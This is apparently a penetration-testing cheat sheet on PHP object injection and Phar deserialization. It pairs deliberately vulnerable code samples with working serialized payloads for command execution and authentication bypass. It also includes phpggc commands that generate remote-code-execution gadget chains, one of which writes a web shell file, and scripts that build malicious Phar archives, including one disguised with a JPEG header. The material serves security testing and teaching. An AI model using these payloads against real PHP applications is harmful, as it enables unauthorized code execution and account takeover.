# PHP Deserialization

PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

The following magic methods will help you for a PHP Object injection

* __wakeup() when an object is unserialized.
* __destruct() when an object is deleted.
* __toString() when an object is converted to a string.

Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.

## Summary

* [General concept](#general-concept)
* [Authentication bypass](#authentication-bypass)
* [Object Injection](#object-injection)
* [Finding and using gadgets](#finding-and-using-gadgets)
* [Phar Deserialization](#phar-deserialization)
* [Real world examples](#real-world-examples)
* [References](#references)

## General concept

Vulnerable code:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Craft a payload using existing code inside the application.

```php
# Basic serialized data
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# Command execution
string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
```

## Authentication bypass

### Type juggling

Vulnerable code:

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

Because `true == "str"` is true.

## Object Injection

Vulnerable code:

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

We can do an array like this:

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## Finding and using gadgets

Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.

* In PHP source code, look for `unserialize()` function.
* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
    * `__construct()`: PHP class constructor, is automatically called upon object creation
    * `__destruct()`: PHP class destructor, is automatically called when references to the object are removed from memory
    * `__toString()`: PHP call-back that gets executed if the object is treated like a string
    * `__wakeup()` PHP call-back that gets executed upon deserialization

[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:

- Laravel
- Symfony
- SwiftMailer
- Monolog
- SlimPHP
- Doctrine
- Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar Deserialization

Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.

A valid PHAR includes four elements:

1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
2. **Manifest**: Contains metadata about the archive and its contents.
3. **File Contents**: Contains the actual files in the archive.
4. **Signature**(optional): For verifying archive integrity.


* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
    ```php
    <?php
    class PDFGenerator { }

    //Create a new instance of the Dummy class and modify its property
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; //our payload

    // Delete any existing PHAR archive with that name
    @unlink("poc.phar");

    // Create a new archive
    $poc = new Phar("poc.phar");

    // Add all write operations to a buffer, without modifying the archive on disk
    $poc->startBuffering();

    // Set the stub
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* Add a new file in the archive with "text" as its content*/
    $poc["file"] = "text";
    // Add the dummy object to the metadata. This will be serialized
    $poc->setMetadata($dummy);
    // Stop buffering and write changes to disk
    $poc->stopBuffering();
    ?>
    ```

* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
    ```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // create new Phar
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // add object of any class as meta data
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
    ```

## Real world examples

* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)

## References

* [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
* [Utilizing Code Reuse/ROP in PHP](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
* [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
* [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
* [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
* [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
* [CTF writeup: PHP object injection in kaspersky CTF](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
* [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
* [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
* [phar:// deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - Aug 11, 2022 - xanhacks](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)